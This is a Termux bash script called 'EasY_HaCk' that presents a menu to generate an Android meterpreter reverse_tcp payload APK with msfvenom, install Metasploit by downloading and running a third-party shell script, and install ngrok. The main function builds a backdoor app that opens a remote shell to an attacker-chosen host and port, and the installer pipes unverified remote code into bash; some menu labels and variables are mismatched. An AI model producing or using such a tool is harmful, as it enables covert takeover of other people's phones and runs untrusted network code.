#!/data/data/com.termux/files/usr/bin/bash
clear
check=0
check=1
ok="nok"
ENTER="press ENTER for main menu"
#colours
w='\e[97m'
g='\033[1;32m'
r='\033[1;31m'
a='\033[1;34m'
b='\e[1;4m'
cyan='\033[1;36m'
green='\033[1;32m'
red='\033[1;31m'
yellow='\033[1;33m'
blue='\033[1;34m'
purple='\033[1;35m'
reset='\033[0m'
echo -e $yellow
figlet -f big "EasYHaCk"
echo -e "                   $g"Alpha"$r"Team"$w"DZ"" 
echo -e "$a             # # # # # # # # # # # # "
echo -e "$a             #    $r"EasY_HaCk  V1.0"$a   #"
echo -e "$a             # # # # # # # # # # # #"
echo
echo -e "    $green Welcome to This Tool For Penetration Testing                     Developed by ZAKI-F"
echo
echo -e "            $red Press ENTER to Continue"
read tmp
echo -e "$yellow MAIN MENU"
echo -e "$red ----------"

echo -e "$a [$r"01"$a"]"$g CREATE PAYLOAD"
echo -e "$a [$r"02"$a"]"$g INSTALL METASPLOIT"
echo -e "$a [$r"03"$a"]"$g INSTALL NGROK"
echo -e "$a [$r"04"$a"]"$g ABOUT"
echo -e "$a [$r"05"$a"]"$g CREDIT"
echo -e "$a [$r"06"$a"]"$g CONTACT ME"
echo -e "$a [$r"07"$a"]"$g EXIT $reset"
read option
if [[ $option == "" ]];
then
	echo -e "$red Please enter correct number of choice"
	echo
	echo -e "$green Plz wait... You are redirecting to main menu"
	sleep 2
	EasY_HaCk
fi
check_dependencies()
{
	echo -e "$white checking metasploit Framework ..."
	sleep 1
     if [ -f $PREFIX/bin/msfconsole ]; then
	     echo -e "$cyan OK$reset"
	     ok="ok"
     else
	     echo
	     echo -e "$red please make sure metasploit is installed if not so please select 3 for metasploit."
	     echo
	    echo -e "$red                         $ENTER$reset"
	    read tmp
	    EasY_HaCk
	  fi
	  if [ $ok = "ok" ];
	  then
	$PREFIX/bin/sed -i '3 a check=1' $HOME/EasY_HaCk/EasY_HaCk.sh

fi
}

install_metasploit()
{
echo -e "$green it can take upto$red 10-15mins and also depends on your net speed"
sleep 1
find . -type f -name metasploit-framework\* -exec rm {} \;
if [ -e $PREFIX/bin/curl ]; then
#meta link
curl -LO https://raw.githubusercontent.com/Hax4us/Metasploit_termux/master/metasploit.sh
bash metasploit.sh
echo
echo -e "$red if you dont think , all were ok so try again with fast internet"
echo -e "$red                         $ENTER$reset"
read tmp1
else 

	apt install curl
	echo -e "$green it can take upto 10-15mins and also depends on your net speed"
	sleep 1
	find . -type f -name metasploit-framework\* -exec rm {} \;
		#meta link
		curl -LO https://raw.githubusercontent.com/Hax4us/Metasploit_termux/master/metasploit.sh
		bash metasploit.sh
		echo
		echo -e "$red if you dont think , all were ok so try again with fast internet"
	echo -e "$ref                    $ENTER$reset"
	read tmp2
	EasY_HaCk
fi
}

create_payload()
{
 echo -e "$red Give the Following Informations"
 echo -e " ------------------------------"
 echo -e "$cyan 1)$yellow LHOST ="
 read lhost
 echo -e "$cyan 2)$yellow LPORT ="
 read lport
 echo -e "$cyan 3)$yellow Name Your $red[Apk]$yellow File ="
 read apkname
 if [ -L $PREFIX/bin/msfvenom ];
 then
	 echo -e "$cyan Please wait for the payload to be Created..."
	 msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport R > $HOME/EasY_HaCk/payload/$apkname.apk
	echo
	echo -e "$green Payload Created Successfully Check EasY_HaCk/payload folder"
	echo -e "$purple:)$reset"
else
	echo
	echo -e "$red Msfvenom was not found :("
	echo
	echo -e "$green Please install metasploit using 2nd option"
	echo
	echo -e "$red                    $ENTER$reset:"
	read tmp3
	EasY_HaCk
fi
}

install_ngrok()
{
if [ -e $PREFIX/bin/curl ];
then
	curl -LO https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip
	apt install unzip
	unzip ngrok-stable-linux-arm.zip
	mv ngrok $PREFIX/bin/
	chmod +x $PREFIX/bin/ngrok
	echo
	echo -e "$green Ngrok is installed :)"
	echo 
	echo -e "$red Plz wait...you are redirecting to main menu$reset"
	sleep 1
	EasY_HaCk
else
	apt install curl
	curl -LO https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip
	apt install unzip
	unzip ngrok-stable-linux-arm.zip
	mv ngrok $PREFIX/bin/
	chmod +x $PREFIX/bin/ngrok
	echo
	echo -e "Ngrok is installed :)"
	echo
	echo -e "Plz wait...you are redirecting to main menu$reset"
	sleep 2
	EasY_HaCk

fi
}

about()
{
echo -e "$green                    EasY_HaCk $yellow

This tool is to provide easy user interface My aim behind this tool is to make penetration testing easy like payload creation, metasploit installation, ngrok installation & Wait for my updates of$r EasY_HaCk$yellow tool with some extra features and options$r (o_O)$reset"
echo
echo -e "$red                    press ENTER"
read tmpp
EasY_HaCk
}

credits()
{
echo -e "$yellow CREDITS GOES TO$g SABRi$yellow"@"$green"ZAKI"$yellow from $g"Alpha"$r"Team"$w"DZ"$yellow &$g Hux4us$reset"
echo
echo -e "$red                    press ENTER"
read tmp
EasY_HaCk
}

contact()
{
echo -e "$green ************ Do You Want to Contact Me ? ************"
echo -e "$r                     press ENTER$reset"
read tmp4
echo -e "$green ********** My Facebook ID> $yellow sabri.zaki.31$g **********"
echo -e "$red               $ENTER$reset"
read tmp5
EasY_HaCk
}
case "$option" in
	1) if [ $check = 0 ];
		then
			check_dependencies
			fi
			create_payload
		;;
	2) install_metasploit
		;;
	3) install_ngrok
		;;
	4) about
		;;
	5) credits
		;;
	6) contact
		;;
	7) exit
		;;
esac


